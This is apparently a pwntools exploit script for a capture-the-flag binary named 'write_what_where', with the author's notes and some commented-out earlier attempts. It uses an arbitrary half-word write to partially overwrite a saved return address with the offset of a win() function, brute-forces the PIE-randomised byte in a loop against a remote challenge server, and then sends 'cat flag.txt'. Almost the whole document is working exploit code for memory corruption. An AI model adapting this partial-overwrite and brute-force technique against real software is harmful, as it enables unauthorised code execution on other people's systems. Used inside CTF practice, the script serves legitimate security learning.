#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("write_what_where")

gs = '''
b *vuln+145
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 16612)
    else:
        return process(elf.path)

# Plan: We have an arbitrary write and there is a win() function. The binary has ALL security mechanisms enabled.
# The arbitrary write: We can specify both the index and value of vulnbuf, so we are going to find the offset
# to the return addr in the vuln() and then overwrite it with the offset to win (since PIE is enabled) and
# without touching the canary.

# The offset from index 0 of vulnbuf to the return addr in vuln() is 120. Next up we have to figure out if it
# we are jumping 2 every time we increase the index by 1. I Think it is because it is a half word array, meaning
# that every index holds 16-bits or 2 byte.
# So we have to write to index: 120/2 = 60 which is the retn addr. We can overwrite the 2 least significant bytes
# which is enough since they are the offset when PIE is enabled

# Find the offset from where ret normally jumps to and the addr of win().
# # normally jumps to main+108 

# gtg
# the lsb is always the same but the 2nd lsb (which we also control) is unpredictable. Maybe we need a brute force or
# to find some kind of offset

# Addresses

# Functions
"""
for j in range(4):
    for i in range(255):
        try:
            io = start()

            io.recvline(timeout=1)

            p = b"60"
            io.sendline(p)
            #i = 100
            #p1 = (256*i) + 65 # 256*n + 65
            #p1 = str(p1)
            #p1 = bytes(p1, 'utf-8')

            #io.sendline(p1)
            io.sendline(b"21313")

            io.sendline("cat flag.txt")

            recv = io.recv()

            if b"YOU" in recv:
                print(recv)
                with open("result.txt", "w") as file:
                    file.write(recv)

            else:
                io.close()


        except EOFError:
            # Handle EOF error, restart the loop
            print("EOF detected, restarting the loop...")
            io.close()  # Close the current connection and restart


"""
"""
for i in range(255):
    print(i)
    io = start()

    io.recvline(timeout=1)

    p = b"60"
    io.sendline(p)
    i = 100
    p1 = (256*i) + 65 # 256*n + 65
    p1 = str(p1)
    p1 = bytes(p1, 'utf-8')

    io.sendline(p1)
    #io.sendline(b"65")

    io.interactive()


"""
for i in range(5000):
    print(i)
    io = start()

    io.recvline(timeout=1)

    p = b"60"
    io.sendline(p)

    #i = 0
    #p1 = (256*i) + 65 # 256*n + 65
    #p1 = str(p1)
    #p1 = bytes(p1, 'utf-8')
    io.sendline(b"17213")

    sleep(0.1)

    io.sendline("cat flag.txt")
    recv = io.recvline(timeout=0.1)
    print(recv) 
    if b"udctf" in recv:
        print(recv)
        break

    recv = io.recvline(timeout=0.1)
    print(recv)
    if b"udctf" in recv:
        print(recv)
        break

    io.close()




    #io.interactive()
